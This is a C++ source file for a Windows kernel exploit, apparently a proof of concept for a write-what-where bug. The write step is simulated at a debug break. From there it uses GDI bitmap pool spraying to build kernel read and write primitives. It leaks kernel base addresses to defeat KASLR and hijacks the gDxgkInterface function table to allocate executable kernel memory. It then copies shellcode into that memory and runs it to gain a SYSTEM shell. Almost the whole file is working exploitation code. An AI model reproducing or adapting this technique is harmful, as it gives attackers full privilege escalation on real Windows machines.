// GetExec_Alloc_1703.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <Windows.h>

HBITMAP h1, h2;
DWORD64 g_PTEBase;

extern "C" VOID Payload();
extern "C" DWORD64 NtGdiDdDDICreateAllocation(DWORD64 Param1, DWORD64 Param2, DWORD64 Param3, DWORD64 Param4);

typedef DWORD64(_stdcall *_NtQueryIntervalProfile)(DWORD64 ProfilSource, PULONG Interval);

DWORD64 leakPool()
{
	DWORD64 teb = (DWORD64)NtCurrentTeb();
	DWORD64 pointer = *(PDWORD64)(teb + 0x78);
	DWORD64 addr = pointer & 0xFFFFFFFFF0000000;
	addr += 0x16300000;
	//addr += 0x17300000;
	return addr;
}

DWORD64 readQword(DWORD64 addr)
{
	DWORD64 value = 0;
	BYTE *res = new BYTE[0x8];
	BYTE *pbits = new BYTE[0xe00];
	memset(pbits, 0, 0xe00);
	GetBitmapBits(h1, 0xe00, pbits);

	PDWORD64 pointer = (PDWORD64)pbits;
	pointer[0x1BC] = addr;
	SetBitmapBits(h1, 0xe00, pbits);
	GetBitmapBits(h2, 0x8, res);
	for (int i = 0; i < 8; i++)
	{
		DWORD64 tmp = ((DWORD64)res[i]) << (8 * i);
		value += tmp;
	}
	delete[] pbits;
	delete[] res;
	return value;
}

BOOL writeQword(DWORD64 addr, DWORD64 value)
{
	BYTE *input = new BYTE[0x8];
	for (int i = 0; i < 8; i++)
	{
		input[i] = (value >> 8 * i) & 0xFF;
	}
	BYTE *pbits = new BYTE[0xe00];
	memset(pbits, 0, 0xe00);
	GetBitmapBits(h1, 0xe00, pbits);

	PDWORD64 pointer = (PDWORD64)pbits;
	pointer[0x1BC] = addr;
	SetBitmapBits(h1, 0xe00, pbits);
	SetBitmapBits(h2, 0x8, input);
	delete[] pbits;
	delete[] input;
	return TRUE;
}

BYTE* readData(DWORD64 start, DWORD64 size)
{
	BYTE* data = new BYTE[size];
	memset(data, 0, size);
	ZeroMemory(data, size);

	BYTE *pbits = new BYTE[0xe00];
	memset(pbits, 0, 0xe00);
	GetBitmapBits(h1, 0xe00, pbits);

	PDWORD64 pointer = (PDWORD64)pbits;
	pointer[0x1BC] = start;
	pointer[0x1B9] = 0x0001000100000364;

	SetBitmapBits(h1, 0xe00, pbits);
	GetBitmapBits(h2, size, data);

	pointer[0x1B9] = 0x0000000100000364;
	SetBitmapBits(h1, 0xe00, pbits);

	delete[] pbits;

	return data;
}


DWORD64 locatefunc(DWORD64 modBase, DWORD64 signature, DWORD64 size)
{
	DWORD64 tmp = 0;
	DWORD64 hash = 0;
	DWORD64 addr = modBase + 0x1000;

	DWORD64 pe = (readQword(modBase + 0x3C) & 0x00000000FFFFFFFF);
	DWORD64 codeBase = modBase + (readQword(modBase + pe + 0x2C) & 0x00000000FFFFFFFF);
	DWORD64 codeSize = (readQword(modBase + pe + 0x1C) & 0x00000000FFFFFFFF);
	if (size != 0)
	{
		codeSize = size;
	}

	BYTE* data = readData(codeBase, codeSize);
	BYTE* pointer = data;

	while (1)
	{
		hash = 0;
		for (DWORD i = 0; i < 4; i++)
		{
			tmp = *(PDWORD64)((DWORD64)pointer + i * 4);
			hash += tmp;
		}
		if (hash == signature)
		{
			break;
		}
		addr++;
		pointer = pointer + 1;
	}

	return addr;
}

DWORD64 locategDxgkInterface(DWORD64 modBase)
{
	DWORD64 DrvOcclusionStateChangeNotifyAddr = locatefunc(modBase, 0x424217e9330676ec, 0);
	printf("Located nt!DrvOcclusionStateChangeNotify at: 0x%llx\n", DrvOcclusionStateChangeNotifyAddr);
	DWORD64 offset = (readQword(DrvOcclusionStateChangeNotifyAddr + 0x16) & 0xFFFFFFFF);
	DWORD64 gDxgkInterfacePointer = DrvOcclusionStateChangeNotifyAddr + offset + 0x1a;
	DWORD64 gDxgkInterfaceAddr = readQword(gDxgkInterfacePointer);
	return gDxgkInterfaceAddr;
}

DWORD64 allocatePool(DWORD64 size, DWORD64 win32kfullBase, DWORD64 ntBase)
{
	DWORD64 gDxgkInterface = locategDxgkInterface(win32kfullBase);
	DWORD64 ExAllocatePoolWithTagAddr = ntBase + 0x27f3a0;
	writeQword(gDxgkInterface + 0x68, ExAllocatePoolWithTagAddr);
	DWORD64 poolAddr = NtGdiDdDDICreateAllocation(0, size, 0x41424344, 0x111);
	return poolAddr;
}

DWORD64 getmodBaseAddr(DWORD64 addr)
{
	DWORD64 baseAddr = 0;
	DWORD64 signature = 0x00905a4d;
	DWORD64 searchAddr = addr & 0xFFFFFFFFFFFFF000;

	while (TRUE)
	{
		DWORD64 readData = readQword(searchAddr);
		DWORD64 tmp = readData & 0xFFFFFFFF;
		if (tmp == signature)
		{
			baseAddr = searchAddr;
			break;
		}
		searchAddr = searchAddr - 0x1000;
	}

	return baseAddr;
}



VOID writeShellcode(DWORD64 addr)
{
	PDWORD64 buffer = (PDWORD64)Payload;
	for (DWORD i = 0; i < 0x18; i++)
	{
		writeQword(addr + i * 8, buffer[i]);
	}
	return;
}

DWORD64 leakNtBase()
{
	DWORD64 ObjAddr = leakPool() + 0x3000;
	DWORD64 cdd_DrvSynchronizeSurface = readQword(readQword(ObjAddr + 0x30) + 0x6f0);
	DWORD64 offset = readQword(cdd_DrvSynchronizeSurface + 0x2d) & 0xFFFFF;
	DWORD64 ntAddr = readQword(cdd_DrvSynchronizeSurface + 0x31 + offset);
	DWORD64 ntBase = getmodBaseAddr(ntAddr);
	return ntBase;
}

DWORD64 leakWin32kfullBase(DWORD64 ntBase)
{

	DWORD64 KeCapturePersistentThreadState = locatefunc(ntBase, 0x5198cb5ca70e485d, 0x200000); //nt!KeCapturePersistentThreadState+0xc0
	printf("Located nt!KeCapturePersistentThreadState at: 0x%llx\n", KeCapturePersistentThreadState);
	PDWORD64 buf = (PDWORD64)0x1a000050;
	DWORD64 offset = readQword(KeCapturePersistentThreadState + 0x3F) & 0x00000000FFFFFFFF;
	DWORD64 flink = readQword(KeCapturePersistentThreadState + offset + 0x43);
	printf("Located nt!PsLoadedModuleList at: 0x%llx\n", flink);

	DWORD64 namePointer = 0;
	DWORD64 nameBytes1 = 0;
	DWORD64 nameBytes2 = 0;
	DWORD64 win32kfullAddr = 0;
	while (1)
	{
		namePointer = readQword(flink + 0x60);
		nameBytes1 = readQword(namePointer);
		if (nameBytes1 == 0x0033006e00690077)
		{
			nameBytes2 = readQword(namePointer + 0x8);
			if (nameBytes2 == 0x00750066006b0032)
			{
				win32kfullAddr = readQword(flink + 0x30);
				break;
			}
		}
		flink = readQword(flink);
	}
	return win32kfullAddr;
}



int main()
{
	LoadLibraryA("user32.dll");
	PDWORD64 buffer = (PDWORD64)VirtualAlloc((LPVOID)0x1a000000, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memset(buffer, 0, 0x1000);

	HDC dc = GetDC(NULL);

	buffer[0] = leakPool();
	printf("Pool leak address is: 0x%llx\n", buffer[0]);
	DWORD64 size = 0x10000000 - 0x270;
	BYTE *pBits = new BYTE[size];
	memset(pBits, 0x41, size);
	printf("Performing Bitmap Pool spray\n");
	DWORD amount = 0x4;
	HBITMAP *hbitmap = new HBITMAP[amount];

	for (DWORD i = 0; i < amount; i++)
	{
		hbitmap[i] = CreateBitmap(0x3FFFF64, 0x1, 1, 32, pBits);
	}

	DeleteObject(hbitmap[1]);

	DWORD64 size2 = 0x1000 - 0x270;
	BYTE *pBits2 = new BYTE[size2];
	memset(pBits2, 0x42, size2);
	HBITMAP *hbitmap2 = new HBITMAP[0x10000];
	for (DWORD i = 0; i < 0x2500; i++)
	{
		hbitmap2[i] = CreateBitmap(0x364, 0x1, 1, 32, pBits2);
	}
	printf("Simulate Write-What-Where now\n");
	Sleep(2000);
	//fake write-what-where here
	buffer[1] = 0xFF;
	DebugBreak();

	LONG value = 0;
	DWORD index = 0;

	BYTE *dummyOutput = new BYTE[0xe00];
	memset(dummyOutput, 0, 0xe00);

	for (int i = 0; i < 0x2500; i++)
	{
		value = GetBitmapBits(hbitmap2[i], 0xe00, dummyOutput);
		if (value == 0xe00)
		{
			index = i;
			break;
		}
	}

	h1 = hbitmap2[index];
	PDWORD64 pointer = (PDWORD64)dummyOutput;
	h2 = (HBITMAP)pointer[0x1B2];
	printf("Found overwritten bitmap - handle: 0x%llx\n", h1);
	printf("Found second bitmap - handle: 0x%llx\n", h2);
	buffer[2] = (DWORD64)h1;
	buffer[3] = (DWORD64)h2;

	HBITMAP h3 = (HBITMAP)readQword(leakPool() + 0x3000);
	printf("Handle of bitmap at offset 0x3000 is: 0x%llx\n", h3);
	DeleteObject(h3);

	HBITMAP *KASLRbitmap = new HBITMAP[0x200];
	for (DWORD i = 0; i < 0x200; i++)
	{
		KASLRbitmap[i] = CreateCompatibleBitmap(dc, 1, 0x364);
	}
	printf("Performed reallocation with CompatibleBitmaps\n");
	DWORD64 ntBase = leakNtBase();
	buffer[4] = ntBase;
	printf("Found ntoskrnl.exe base address: 0x%llx\n", ntBase);
	DWORD64 win32kfullBase = leakWin32kfullBase(ntBase);
	buffer[5] = win32kfullBase;
	printf("Found win32kfull.sys base address: 0x%llx\n", win32kfullBase);
	DWORD64 gDxgkInterface = locategDxgkInterface(win32kfullBase);
	buffer[6] = gDxgkInterface;
	printf("Found gDxgkInterface function table at: 0x%llx\n", gDxgkInterface);
	DWORD64 DxgkCreateAllocation = readQword(gDxgkInterface + 0x68);
	buffer[7] = DxgkCreateAllocation;
	printf("Allocating RWX kernel memory\n");
	DWORD64 poolAddr = allocatePool(0x1000, win32kfullBase, ntBase);
	buffer[8] = poolAddr;
	printf("Memory allocated successfully at: 0x%llx\n", poolAddr);
	writeShellcode(poolAddr);
	printf("Shellcode copied to allocated kernel memory\n");
	writeQword(gDxgkInterface + 0x68, poolAddr);
	printf("Gaining kernel code execution\n");
	NtGdiDdDDICreateAllocation(gDxgkInterface + 0x68, DxgkCreateAllocation, 0, 0);
	printf("Shellcode executed enjoy System shell\n");
	return 0;
}


